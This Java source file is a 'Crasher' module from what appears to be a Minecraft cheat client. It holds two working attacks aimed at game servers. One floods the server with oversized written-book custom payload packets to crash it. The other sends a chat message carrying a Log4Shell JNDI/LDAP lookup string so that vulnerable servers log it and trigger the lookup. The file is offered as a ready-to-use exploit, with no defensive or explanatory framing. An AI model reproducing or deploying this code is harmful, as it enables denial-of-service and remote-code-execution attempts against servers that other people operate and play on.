package cc.sleek.client.module.impl.exploit;

import cc.sleek.client.event.impl.UpdateEvent;
import cc.sleek.client.module.Module;
import cc.sleek.client.module.api.Category;
import cc.sleek.client.module.api.ModuleInfo;
import cc.sleek.client.property.impl.EnumValue;
import cc.sleek.client.util.IPacketUtil;
import io.github.nevalackin.homoBus.Listener;
import io.github.nevalackin.homoBus.annotations.EventLink;
import io.netty.buffer.Unpooled;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomUtils;

import java.util.Random;

/**
 * @author Kansio
 */
@ModuleInfo(name = "Crasher", description = "Tries to troll the server.", category = Category.EXPLOIT)
public class Crasher extends Module {

    private final EnumValue<ModeValue> mode = new EnumValue<>("Mode", ModeValue.values());


    @EventLink
    private final Listener<UpdateEvent> updateEventListener = event -> {
        switch (mode.getValue()) {
            case BOOK: {
                for (int c = 0; c < 100; c++) {
                    try {
                        ItemStack bookObj = new ItemStack(Items.written_book);
                        String author = "xDark" + Math.random() * 400.0;
                        String title = "LOL KEK " + Math.random() * 400.0;
                        String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                        NBTTagCompound tag = new NBTTagCompound();
                        NBTTagList list = new NBTTagList();
                        for (int i = 0; i < 50; ++i) {
                            String siteContent = mm255;
                            NBTTagString tString = new NBTTagString(siteContent);
                            list.appendTag(tString);
                        }
                        tag.setString("author", author);
                        tag.setString("title", title);
                        tag.setTag("pages", list);
                        if (bookObj.hasTagCompound()) {
                            NBTTagCompound nbttagcompound = bookObj.getTagCompound();
                            nbttagcompound.setTag("pages", list);
                        } else
                            bookObj.setTagInfo("pages", list);
                        String s2 = "MC|BEdit";
                        if (new Random().nextBoolean()) {
                            s2 = "MC|BSign";
                        }
                        bookObj.setTagCompound(tag);
                        PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
                        packetbuffer.writeItemStackToBuffer(bookObj);
                        IPacketUtil.sendPacketNoEvent(new C17PacketCustomPayload(s2, packetbuffer));
                    } catch (Exception exc) {
                    }
                }
                break;
            }

            case LOG4J: {
                String url = "${jndi:ldap://192.168." + RandomUtils.nextInt(1, 253) + "." + RandomUtils.nextInt(1, 253) + "}";

                mc.thePlayer.sendChatMessage("/msg " + mc.thePlayer.getName() + " " + url);
                break;
            }

        }

        toggle();
    };


    private enum ModeValue {
        BOOK,
        LOG4J
    }
}
